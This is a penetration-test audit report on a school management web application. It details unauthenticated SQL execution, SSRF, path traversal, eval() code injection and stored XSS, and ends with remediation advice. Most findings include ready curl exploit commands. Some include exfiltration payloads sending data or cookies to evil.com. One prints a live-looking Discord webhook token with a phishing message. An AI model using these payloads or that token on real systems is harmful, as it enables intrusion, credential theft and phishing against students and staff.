# Security Audit Report — es_ldcu

**Date:** June 5, 2026  
**Auditor:** Penetration Test / Application Security Review  
**Scope:** Full codebase (excluding file upload RCE vectors and `eval()` in `GenerateGrade.php`)  
**Severity Scale:** Critical > High > Medium > Low

---

## Executive Summary

This audit uncovered **13 distinct vulnerability classes** across the codebase, including multiple **Critical** and **High** severity issues. The most dangerous findings involve unauthenticated endpoints that allow arbitrary SQL execution, arbitrary database manipulation, server-side request forgery, arbitrary file download, and additional `eval()` code injection vectors beyond the known one.

---

## CRITICAL Findings

---

### 1. Unauthenticated Arbitrary SQL Execution (Direct Raw Query Injection)

**Type:** SQL Injection — Arbitrary Query Execution (CWE-89)  
**Severity:** CRITICAL  
**CVSS:** 10.0

**Location:**  
- `app/Models/Synchronization/SychronizationProcess.php` line 110, function `process_updatelogs()`
- Called via `app/Http/Controllers/SyncController/SyncControllerV2.php` line 37

**Route (NO AUTH — only `cors` middleware):**
```
routes/web.php:3331  Route::get('/synchornization/process/updatelogs', 'SyncController\SyncControllerV2@process_updatelogs');
```

**Vulnerable Code:**
```php
// SyncControllerV2.php
public function process_updatelogs(Request $request){
    $query = $request->get('query');
    $binding = $request->get('binding');
    return \App\Models\Synchronization\SychronizationProcess::process_updatelogs($query, $binding);
}

// SychronizationProcess.php line 110
public static function process_updatelogs($query = null, $binding = null){
    DB::update($query, $binding);  // <-- ARBITRARY SQL FROM USER INPUT
}
```

**Why It Is Exploitable:**

This endpoint takes a **raw SQL query string** and bindings directly from GET parameters and passes them to `DB::update()`. The route is protected ONLY by `cors` middleware (which just adds headers) — there is no authentication. An attacker can execute ANY SQL statement against the database.

Despite being named `DB::update()`, MySQL/Laravel can be coerced into executing multi-statement queries or using `UPDATE ... INTO OUTFILE` for file writes.

**Impact:**
- Execute arbitrary SQL (read/write/delete any data)
- Dump all passwords, PII, financial records
- Modify/destroy all database tables
- Potential OS command execution via MySQL `LOAD_FILE()` / `INTO OUTFILE`
- Create new admin accounts

**POC:**

```bash
# Change any user to super admin (type 17)
curl "https://target.com/synchornization/process/updatelogs?query=UPDATE%20users%20SET%20type%3D17%20WHERE%20email%3D%3F&binding[]=S20230001"

# Reset a password to known value
curl "https://target.com/synchornization/process/updatelogs?query=UPDATE%20users%20SET%20password%3D%3F%20WHERE%20id%3D1&binding[]=%242y%2410%24knownhash"

# Read file via MySQL INTO OUTFILE (if FILE privilege available)
curl "https://target.com/synchornization/process/updatelogs?query=UPDATE%20users%20SET%20name%3DLOAD_FILE('/etc/passwd')%20WHERE%20id%3D1&binding[]="
```

---

### 2. Unauthenticated Arbitrary Database Read/Write/Delete (SQL Injection via Table Name + Mass Data Manipulation)

**Type:** Broken Access Control + SQL Injection (CWE-284, CWE-89)  
**Severity:** CRITICAL  
**CVSS:** 10.0

**Location:**  
- `app/Http/Controllers/SyncController.php` — functions `insertdatatotable()`, `updatetargettable()`, `deletetargettable()`, `synccheckreturn()`, `syncdeletedreturn()`, `syncupdatereturn()`, `cloudNewData()`, `cloudUpdatedData()`, `cloudDeletedData()`, `checktargetmaxtable()`, `getTableFields()`, `getOfflinerefIdMax()`
- `app/Http/Controllers/SyncController/SyncControllerV2.php` — functions `synccreate()`, `syncupdate()`, `syncdelete()` (also unauthenticated, only `cors` middleware)

**Routes (NO AUTH MIDDLEWARE):**
```
routes/web.php:647   Route::get('cloudNewData/{table}/{maxval}', 'SyncController@cloudNewData');
routes/web.php:648   Route::get('cloudUpdatedData/{table}/{date}', 'SyncController@cloudUpdatedData');
routes/web.php:649   Route::get('cloudDeletedData/{table}/{date}', 'SyncController@cloudDeletedData');
routes/web.php:3155  Route::get('insertdatatotable', 'SyncController@insertdatatotable');
routes/web.php:3156  Route::get('updatetargettable', 'SyncController@updatetargettable');
routes/web.php:3157  Route::get('deletetargettable', 'SyncController@deletetargettable');
routes/web.php:3161  Route::get('getTableFields/{id}', 'SyncController@getTableFields');
routes/web.php:3326  Route::get('/synchornization/insert', 'SyncControllerV2@synccreate');
routes/web.php:3327  Route::get('/synchornization/update', 'SyncControllerV2@syncupdate');
routes/web.php:3328  Route::get('/synchornization/delete', 'SyncControllerV2@syncdelete');
routes/web.php:5294  (duplicated routes — same endpoints)
```

**Why It Is Exploitable:**

These routes sit **outside** any `Route::middleware(['auth'])` group. Any anonymous internet user can hit them. The controller accepts a user-supplied table name and directly queries it:

```php
// SyncController.php line ~260
public function insertdatatotable(Request $request){
    $data = json_decode($request->get('data'),true);
    DB::table($request->get('table'))->insert($data);
}

public function updatetargettable(Request $request){
    $data = json_decode($request->get('data'),true);
    db::table($request->get('table'))
        ->where('id', $data['id'])
        ->update(collect($data)->toArray());
}
```

The table name is taken directly from user input with **zero validation**. Additionally, `cloudNewData` leaks entire table contents:

```php
public function cloudNewData($tablename, $maxid){
    $max = db::table($tablename)->max('id');
    $data = db::table($tablename)->whereBetween('id', [$maxid + 1, $max])->get();
    return $data;
}
```

**Impact:**
- Full database read (dump all tables including `users`, passwords, PII)
- Arbitrary record insertion (create admin accounts)
- Arbitrary record modification (elevate privileges, tamper financial records)
- Arbitrary record deletion (destroy evidence/audit trails)

**POC:**

```bash
# Read all users (including password hashes)
curl "https://target.com/cloudNewData/users/0"

# Read the schema of any table
curl "https://target.com/getTableFields/users"

# Insert a new super admin account (type 17 = super admin)
curl "https://target.com/insertdatatotable?table=users&data=%7B%22name%22%3A%22hacker%22%2C%22email%22%3A%22hacker%22%2C%22password%22%3A%22%242y%2410%24hash_of_known_password%22%2C%22type%22%3A%2217%22%2C%22deleted%22%3A%220%22%7D"

# Escalate existing user to super admin
curl "https://target.com/updatetargettable?table=users&data=%7B%22id%22%3A%221%22%2C%22type%22%3A%2217%22%7D"

# Dump financial transactions
curl "https://target.com/cloudNewData/chrngtrans/0"
```

---

### 3. Unauthenticated Server-Side Request Forgery (SSRF) via `storeImage`

**Type:** SSRF (CWE-918)  
**Severity:** CRITICAL  
**CVSS:** 9.1

**Location:** `app/Http/Controllers/SyncController.php` line 339, function `storeImage()`

**Route (NO AUTH):**
```
routes/web.php:651   Route::get('storeImage', 'SyncController@storeImage');
```

**Vulnerable Code:**
```php
public function storeImage(Request $request){
    $response = file_get_contents($request->get('imagepath'));
    // ... writes to public directory
}
```

**Why It Is Exploitable:**

The `imagepath` parameter is taken directly from user input and passed to `file_get_contents()` with no URL validation or allowlisting. This endpoint is unauthenticated. An attacker can:
- Read internal files via `file://` protocol
- Access internal services/metadata endpoints (e.g., AWS `169.254.169.254`)
- Scan internal network ports
- Exfiltrate data to attacker-controlled servers

**Impact:**
- Read arbitrary local files (e.g., `.env` containing database credentials, APP_KEY)
- Access cloud instance metadata (AWS/GCP/Azure credentials)
- Internal network reconnaissance
- Potential RCE via chaining with other services

**POC:**

```bash
# Read .env file (contains DB passwords, APP_KEY, API keys)
curl "https://target.com/storeImage?imagepath=file:///var/www/html/.env&tablename=onlinepayments"

# Read /etc/passwd
curl "https://target.com/storeImage?imagepath=file:///etc/passwd&tablename=onlinepayments"

# Access AWS metadata
curl "https://target.com/storeImage?imagepath=http://169.254.169.254/latest/meta-data/iam/security-credentials/&tablename=onlinepayments"

# Windows - read config
curl "https://target.com/storeImage?imagepath=file:///c:/laragon/www/es_ldcu/.env&tablename=onlinepayments"
```

---

### 4. Remote Code Execution via `eval()` in DynamicPDFController (Database-Stored Formula)

**Type:** Code Injection / RCE (CWE-94)  
**Severity:** CRITICAL  
**CVSS:** 9.8

**Location:**  
- `app/Http/Controllers/PrincipalControllers/DynamicPDFController.php` line ~1689
- `app/Http/Controllers/PrincipalControllers/DynamicPDFController - Original 61523.php` line 993

**Vulnerable Code:**
```php
foreach ($studentinformation as $item) {
    $tempvariable = collect($sf9templatestudinfo)
        ->where('id', $item->dataid)
        ->first();
    
    $sheet->setCellValue($cellitem, eval('return ' . $tempvariable->formula . ';'));
}
```

**Why It Is Exploitable:**

The formula is read from the `sf9templateinfo` database table. Combined with **Finding #1** (unauthenticated DB write), an attacker can inject arbitrary PHP code into this table, which is then executed via `eval()`.

Even without Finding #1, any user with access to modify the `sf9templateinfo` table (admins, principals) can achieve full RCE.

**Impact:** Full server compromise — arbitrary command execution as the web server user.

**POC (chained with Finding #1):**

```bash
# Step 1: Insert malicious formula into sf9templateinfo table
curl "https://target.com/insertdatatotable?table=sf9templateinfo&data=%7B%22id%22%3A%22999%22%2C%22formula%22%3A%22system('whoami')%22%2C%22deleted%22%3A%220%22%7D"

# Step 2: Trigger the eval by requesting the PDF generation endpoint
# (requires auth, but attacker already created admin account via Finding #1)
```

---

### 5. Remote Code Execution via `eval()` in IBEDECRController (Insufficient Input Validation)

**Type:** Code Injection / RCE (CWE-94)  
**Severity:** HIGH  
**CVSS:** 8.8

**Location:** `app/Http/Controllers/SuperAdminController/IBEDECRController.php` line 1271

**Vulnerable Code:**
```php
private function computeFinalGrade(array $studQGs, array $termNos, ?string $finalFormulaCode): ?float
{
    if ($finalFormulaCode) {
        preg_match_all('/\$q(\d+)/', $finalFormulaCode, $m);
        $required = array_unique(array_map('intval', $m[1]));
        // ... replace $qN with float values ...
        $expr = $finalFormulaCode;
        foreach ($studQGs as $n => $g) {
            $expr = str_replace('$q' . $n, (float)$g, $expr);
        }
        try {
            $result = eval('return ' . $expr . ';');
```

**Why It Is Exploitable:**

Unlike `FinalGradeUpload.php` (which validates with `preg_match('/^[0-9+\-*\/().\s]+$/', $expression)`), this controller does **NOT** validate the expression after substitution. The `$finalFormulaCode` comes from the database (grade setup configuration). If an attacker gains write access to the grading formula table (trivially achievable via Finding #1), they can inject arbitrary PHP.

**Impact:** Remote Code Execution on the server.

**POC:**
```bash
# Inject malicious formula into grade_setup or equivalent config table
# Formula: ($q1+$q2)/2; system('id'); //
# After substitution, eval executes: return (85+90)/2; system('id'); //;
```

---

## HIGH Findings

---

### 6. Arbitrary File Download (Path Traversal)

**Type:** Path Traversal / Arbitrary File Read (CWE-22)  
**Severity:** HIGH  
**CVSS:** 7.5

**Location:** `app/Http/Controllers/SchoolFilesController.php` line 1009, function `downloadfile()`

**Route (requires auth but any authenticated user):**
```
routes/web.php:2601  Route::get('/administrator/downloadfile', 'SchoolFilesController@downloadfile');
```

**Vulnerable Code:**
```php
public function downloadfile(Request $request)
{
    return response()->download($request->get('filepath'));
}
```

**Why It Is Exploitable:**

The `filepath` parameter is taken directly from the request with **zero path validation**. Any authenticated user (including students — type 7) can download arbitrary files from the server by path traversal.

**Impact:**
- Download `.env` (database creds, APP_KEY)
- Download `/etc/shadow` on Linux
- Download source code
- Download database backup files

**POC:**
```bash
# Download .env file (any authenticated user)
curl -b "session_cookie" "https://target.com/administrator/downloadfile?filepath=../../../.env"

# Download password file
curl -b "session_cookie" "https://target.com/administrator/downloadfile?filepath=/etc/passwd"

# Download Windows SAM
curl -b "session_cookie" "https://target.com/administrator/downloadfile?filepath=C:\Windows\System32\config\SAM"
```

---

### 7. Hardcoded Default Passwords in Account Creation

**Type:** Use of Hard-coded Credentials (CWE-798)  
**Severity:** HIGH  
**CVSS:** 7.2

**Locations:**
- `app/Http/Controllers/TesdaController/TesdaStudentInformationController.php:185` — `Hash::make('123456')`
- `app/Http/Controllers/AdministratorControllers/FNSAccountController.php:664,756,1224` — `Hash::make('123456')`
- `app/Http/Controllers/enrollment/EnrollmentsController.php:3452,3482` — `Hash::make('123456')`
- `app/Http/Controllers/CollegeControllers/CollegeController_d.php:939` — `Hash::make('123456')`
- `app/Http/Controllers/DebuggerController.php:116,130` — `Hash::make('123456')`
- `app/Http/Controllers/RegistrarControllers/PreRegistrationControllerV2.php:586` — `Hash::make('123456')`

**Why It Is Exploitable:**

Multiple account creation flows set the default password to `123456`. Since the system has student, parent, and teacher accounts, any account created through these flows is immediately vulnerable to credential stuffing with this known default.

**Impact:** Mass unauthorized access to student/parent/teacher accounts.

**POC:**
```bash
# Try default password against any new account
# Username pattern: S{student_id} for students, P{student_id} for parents
curl -X POST "https://target.com/login" -d "email=S20230001&password=123456"
```

---

### 8. Plaintext Password Logging

**Type:** Sensitive Data Exposure / Logging (CWE-312, CWE-532)  
**Severity:** HIGH  
**CVSS:** 6.5

**Location:** `app/Http/Controllers/GeneralController.php` line ~300, function `changePass()`

**Vulnerable Code:**
```php
DB::table('updatelogs')->insert([
    'type' => 1,
    'sql' => $logs . $request->get('password'),  // <-- PLAINTEXT PASSWORD LOGGED
    'createdby' => auth()->user()->id,
    'createddatetime' => \Carbon\Carbon::now('Asia/Manila')
]);
```

**Why It Is Exploitable:**

When users change their password, the new plaintext password is concatenated to the SQL log and stored in the `updatelogs` database table. Combined with Finding #1 (unauthenticated DB read), an attacker can read everyone's plaintext passwords.

Additionally, the `users` table has a `passwordstr` column that stores plaintext passwords in some flows:
```php
// RegistrarModel.php:434
'passwordstr' => $random_string,
```

**Impact:** Complete credential compromise for all users who changed passwords.

**POC:**
```bash
# Dump the updatelogs table containing plaintext passwords
curl "https://target.com/cloudNewData/updatelogs/0"

# Or dump users table which may contain passwordstr
curl "https://target.com/cloudNewData/users/0"
```

---

### 9. Hardcoded Discord Webhook Secret in Source Code

**Type:** Sensitive Data Exposure (CWE-798)  
**Severity:** MEDIUM  
**CVSS:** 5.3

**Location:** `app/Http/Controllers/DiscordWebhookController/DiscordWebhookController.php` line 14

**Vulnerable Code:**
```php
$webhookUrl = "https://discord.com/api/webhooks/1296305826318782535/p_WBX37fvtONrgzhnoeeNnY0rcRfhcWTDXy3d_knv-URYpmCEZLDZ6E_ccLZcJ9ia3Ye";
```

**Why It Is Exploitable:**

The Discord webhook URL (which includes the secret token) is hardcoded in source code. Anyone with access to the repository can send arbitrary messages to the Discord channel, enabling phishing/social engineering attacks against staff.

**Impact:** Ability to send spoofed messages to the school's Discord channel.

**POC:**
```bash
curl -H "Content-Type: application/json" -d '{"content":"URGENT: System maintenance. Please login at https://evil.com/login to verify your account."}' \
  "https://discord.com/api/webhooks/1296305826318782535/p_WBX37fvtONrgzhnoeeNnY0rcRfhcWTDXy3d_knv-URYpmCEZLDZ6E_ccLZcJ9ia3Ye"
```

---

### 10. Dynamic Table Name Injection in Multiple Controllers (Authenticated)

**Type:** SQL Injection via Table Name (CWE-89)  
**Severity:** MEDIUM  
**CVSS:** 6.5

**Locations:**
- `app/Http/Controllers/AdministratorControllers/BuildingController.php:285-364` — `syncNew()`, `syncUpdate()`, `syncDelete()`, `getNewInfo()`, `getUpdateInfo()`, `getDeleteInfo()`, `getUpdateStat()`
- `app/Http/Controllers/AdministratorControllers/FNSAccountController.php:1505-1732` — `sync_delete()`, `sync_update()`
- `app/Http/Controllers/SuperAdminController/TruncateControllerV2.php:14` — `get_table_information()`

**Vulnerable Code (BuildingController example):**
```php
public static function syncNew(Request $request){
    $tablename = $request->get('tablename');
    $data = $request->get('data');
    DB::table($tablename)->insert($data);
}
```

**Why It Is Exploitable:**

While these routes are behind authentication middleware, any authenticated user at the appropriate role level can specify an arbitrary table name. This allows lateral privilege escalation — for example, an administrator can write to financial tables they shouldn't access.

**Impact:** Horizontal privilege escalation, data tampering across module boundaries.

**POC:**
```bash
# Authenticated admin inserts into users table to escalate privileges
curl -b "auth_cookie" "https://target.com/building/syncnew" \
  -d "tablename=users&data[name]=evil&data[email]=evil&data[password]=\$2y\$10\$hash&data[type]=17&data[deleted]=0"
```

---

### 11. Unauthenticated Mobile API Endpoints (Data Leakage + Brute-Force Login)

**Type:** Broken Access Control / Missing Authentication (CWE-306)  
**Severity:** HIGH  
**CVSS:** 7.5

**Location:** `app/Http/Controllers/APIMobileController.php` — function `api_login()` (line 4439) and many data endpoints

**Routes (only `cors` middleware — NO authentication):**
```
routes/web.php:3250  Route::get('/api/mobile/api_login', 'APIMobileController@api_login');
routes/web.php:3251  Route::get('/api/mobile/api_enrollmentinfo', ...);
routes/web.php:3253  Route::get('/api/mobile/api_billinginfo', ...);
routes/web.php:3254  Route::get('/api/mobile/api_studledger', ...);
routes/web.php:3259  Route::get('/api/mobile/api_getgrade', ...);
routes/web.php:3264  Route::get('/api/mobile/api_get_transactions', ...);
```

**Vulnerable Code (`api_login`):**
```php
public function api_login(Request $request)
{
    $user = $request->get('username');
    $pword = $request->get('pword');
    
    $user = db::table('users')->where('email', $user)->where('deleted', 0)->first();
    
    if ($user) {
        if (Hash::check($pword, $user->password)) {
            // Returns full student info, school year, semester data
            // Sets remember_token from user-supplied 'token' parameter
        }
    }
}
```

**Why It Is Exploitable:**

1. **No rate limiting on login**: The `api_login` endpoint has no throttle middleware, enabling unlimited brute-force attempts against any account (especially effective given the `123456` default passwords from Finding #7)
2. **Login credentials sent via GET**: Username and password are in the URL query string, meaning they're logged in web server access logs, proxy logs, browser history, and Referer headers
3. **Data endpoints lack authorization**: Once a valid `studid` is known, many endpoints return financial/academic data without verifying the requester owns that data (IDOR)
4. **User-controlled remember_token**: The `token` parameter from the request is written directly as `remember_token` — an attacker could set this to a known value

**Impact:**
- Brute-force any student/parent account with no lockout
- Access any student's grades, billing, enrollment data by ID enumeration
- Credential exposure in server logs

**POC:**
```bash
# Brute-force login (no rate limiting)
for pwd in 123456 password 12345678; do
  curl "https://target.com/api/mobile/api_login?username=S20230001&pword=$pwd"
done

# IDOR - access another student's grades (just change studid)
curl "https://target.com/api/mobile/api_getgrade?studid=1"
curl "https://target.com/api/mobile/api_getgrade?studid=2"

# Access student financial data
curl "https://target.com/api/mobile/api_studledger?studid=1"
```

---

### 12. Wildcard CORS Policy (`Access-Control-Allow-Origin: *`)

**Type:** Security Misconfiguration (CWE-942)  
**Severity:** MEDIUM  
**CVSS:** 5.3

**Location:** `app/Http/Middleware/Cor.php`

**Vulnerable Code:**
```php
public function handle($request, Closure $next)
{
    return $next($request)
            ->header('Access-Control-Allow-Origin', '*')
            ->header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
}
```

**Why It Is Exploitable:**

All routes using the `cors` middleware return `Access-Control-Allow-Origin: *`, which means **any website** can make cross-origin requests to these endpoints. Combined with the unauthenticated sync/mobile API endpoints, a malicious site visited by a school staff member could silently exfiltrate data or trigger actions.

For authenticated routes that share sessions, if `Access-Control-Allow-Credentials` is ever added, this becomes a full session-riding attack.

**Impact:** Any attacker-controlled website can call vulnerable endpoints in the user's browser context.

**POC:**
```html
<!-- Hosted on attacker's site: silently dumps school database -->
<script>
fetch('https://target.com/cloudNewData/users/0')
  .then(r => r.json())
  .then(data => {
    // Exfiltrate all user accounts
    fetch('https://evil.com/collect', {method:'POST', body: JSON.stringify(data)});
  });
</script>
```

---

### 13. Stored XSS via Unescaped Blade Output (`{!! !!}`)

**Type:** Cross-Site Scripting — Stored XSS (CWE-79)  
**Severity:** MEDIUM  
**CVSS:** 6.1

**Locations (database-sourced values rendered unescaped):**
- `resources/views/academiccoor/layouts/app2.blade.php` — `{!! $schoolinfo->schoolcolor !!}`
- `resources/views/finance/layouts/app.blade.php` — `{!! $schoolinfo->schoolcolor !!}`
- `resources/views/finance/layouts/navbar.blade.php` — `{!! $schoolinfo->schoolcolor !!}`
- `resources/views/adminPortal/layouts/app2.blade.php` — `{!! $schoolinfo->schoolcolor !!}`
- `resources/views/cashier_v2/pages/print_statement_of_account.blade.php` — `{!! $signatoriesHtml !!}`
- Many more layout files across all portals

**Why It Is Exploitable:**

The `{!! !!}` Blade syntax outputs content **without HTML escaping**. The `schoolcolor` field comes from the `schoolinfo` database table. Using Finding #2 (unauthenticated DB write), an attacker can modify `schoolinfo.schoolcolor` to inject JavaScript:

```
</style><script>document.location='https://evil.com/steal?c='+document.cookie</script><style>
```

This XSS fires for **every user on every page load** since it's in the layout template.

**Impact:**
- Session hijacking for all users (students, teachers, admins, finance)
- Keylogging, credential theft
- Persistent defacement
- Worm propagation

**POC:**
```bash
# Step 1: Inject XSS payload into schoolinfo table via unauthenticated endpoint
curl "https://target.com/updatetargettable?table=schoolinfo&data=%7B%22id%22%3A%221%22%2C%22schoolcolor%22%3A%22%3C/style%3E%3Cscript%3Efetch('https://evil.com/c%3F'+document.cookie)%3C/script%3E%3Cstyle%3E%22%7D"

# Step 2: Every user who loads any page now executes the attacker's JavaScript
```

---

## Attack Chain Summary

The most devastating attack path combines findings #1 + #4:

```
1. Attacker (unauthenticated) → /synchornization/process/updatelogs → executes arbitrary SQL
2. Attacker creates super admin account via raw SQL
3. Attacker modifies sf9templateinfo formula field to contain PHP payload
4. Attacker logs in as super admin → triggers DynamicPDFController → eval() → RCE
```

Simpler one-shot attack (Finding #1 alone):
```
1. Attacker → /synchornization/process/updatelogs?query=UPDATE users SET type=17,password='$hash' WHERE id=1
2. Full admin access achieved in a single HTTP request
```

Alternative path via SSRF:
```
1. Attacker → /storeImage?imagepath=file:///path/to/.env → reads APP_KEY + DB creds
2. Forge session cookie using APP_KEY (Laravel cookie encryption)
3. Access all authenticated endpoints
```

Worm-style persistent attack:
```
1. Attacker → /updatetargettable → injects XSS into schoolinfo.schoolcolor
2. Every user on every page load executes attacker's JavaScript
3. JS payload steals session cookies → sends to attacker
4. Attacker uses stolen admin session → full control
```

---

## Recommendations (Priority Order)

1. **IMMEDIATE:** Remove or disable the `/synchornization/process/updatelogs` endpoint entirely — it allows arbitrary SQL execution with zero authentication
2. **IMMEDIATE:** Add authentication middleware to all SyncController and SyncControllerV2 routes (especially `cloudNewData`, `insertdatatotable`, `updatetargettable`, `deletetargettable`, `storeImage`, `getTableFields`, `synccreate`, `syncupdate`, `syncdelete`)
3. **IMMEDIATE:** Implement allowlist validation for table names in SyncController, SyncControllerV2, and BuildingController
4. **IMMEDIATE:** Remove or restrict the `storeImage` SSRF — validate URLs against an allowlist, block `file://` protocol
5. **HIGH:** Replace all `eval()` with safe math expression parsers (e.g., `symfony/expression-language` or a simple recursive descent parser for arithmetic)
6. **HIGH:** Add path validation in `SchoolFilesController@downloadfile` — validate filepath against storage directory
7. **HIGH:** Remove plaintext password logging in `GeneralController@changePass`
8. **HIGH:** Add rate limiting (`throttle` middleware) to the mobile API login endpoint
9. **HIGH:** Implement forced password change for accounts with default `123456` password
10. **MEDIUM:** Replace `{!! !!}` with `{{ }}` for database-sourced values in Blade templates, or sanitize before rendering
11. **MEDIUM:** Replace wildcard CORS `*` with specific allowed origins
12. **MEDIUM:** Move Discord webhook URL to `.env` configuration
13. **MEDIUM:** Remove `passwordstr` column from users table; never store plaintext passwords
14. **LOW:** Audit all route groups for proper middleware coverage
15. **LOW:** Switch mobile API login from GET to POST to prevent credential logging in URLs

---

## Appendix: Files Reviewed

| File | Issues Found |
|------|-------------|
| `app/Http/Controllers/SyncController.php` | Unauth DB access, SSRF |
| `app/Http/Controllers/SyncController/SyncControllerV2.php` | Unauth DB access, arbitrary table injection |
| `app/Models/Synchronization/SychronizationProcess.php` | **Arbitrary raw SQL execution** |
| `app/Http/Controllers/SchoolFilesController.php` | Arbitrary file download |
| `app/Http/Controllers/PrincipalControllers/DynamicPDFController.php` | eval() RCE |
| `app/Http/Controllers/SuperAdminController/IBEDECRController.php` | eval() RCE |
| `app/Http/Controllers/SuperAdminController/FinalGradeUpload.php` | eval() (partially mitigated) |
| `app/Http/Controllers/GeneralController.php` | Password logging |
| `app/Http/Controllers/AdministratorControllers/BuildingController.php` | Dynamic table injection |
| `app/Http/Controllers/AdministratorControllers/FNSAccountController.php` | Dynamic table injection, hardcoded passwords |
| `app/Http/Controllers/APIMobileController.php` | Unauth data access, no rate limiting, GET-based login |
| `app/Http/Controllers/DiscordWebhookController/DiscordWebhookController.php` | Hardcoded secrets |
| `app/Http/Controllers/CashierV2Controller/Home/CashierV2HomeController.php` | shell_exec/popen (low risk - hardcoded commands) |
| `app/Http/Middleware/Cor.php` | Wildcard CORS |
| `resources/views/*/layouts/*.blade.php` | Stored XSS via `{!! !!}` |
| `routes/web.php` | Unauthenticated route exposure |
| `app/Http/Middleware/VerifyCsrfToken.php` | CSRF exceptions (noted, acceptable for API) |
